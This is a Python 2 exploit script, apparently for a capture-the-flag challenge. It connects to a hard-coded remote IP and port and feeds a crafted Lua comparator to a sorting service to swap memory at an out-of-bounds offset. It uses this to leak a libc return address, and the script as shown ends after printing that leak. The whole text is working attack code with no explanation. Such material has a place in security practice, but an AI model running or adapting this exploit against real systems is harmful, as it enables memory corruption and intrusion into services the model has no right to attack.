import sys, socket, time, os, re, telnetlib

def get_comparator(n, offset):
    return """
answers = %s
i = 0
function f(a,b)
  i = i + 1
  return answers[i]
end



""" % os.popen("./compute_answers %d %d" % (n, offset)).read().strip()

def wait_for(s):
    while True:
        p = sock.recv(4096)
        if s in p:
            break

def swap(offset, value):
    n = 1024
    values = [value] + list(xrange(1,n))
    sock.send("7\n" +
              get_comparator(n, n + offset) +
              "1024\n" +
              "\n".join(map(str,values)) + "\n")
    res = None
    while True:
        p = sock.recv(4096)
        m = re.search("Number 1 is now: (\d+)", p)
        if m:
            res = m.group(1)
        if "custom\n:" in p:
            break
    return int(res)

sock = socket.create_connection(("188.40.18.75", 1234))

wait_for("custom\n:")
libc_ret = swap(8, 0x41414141)
print "[*] leaked ret addr to libc_start_main =", hex(libc_ret)
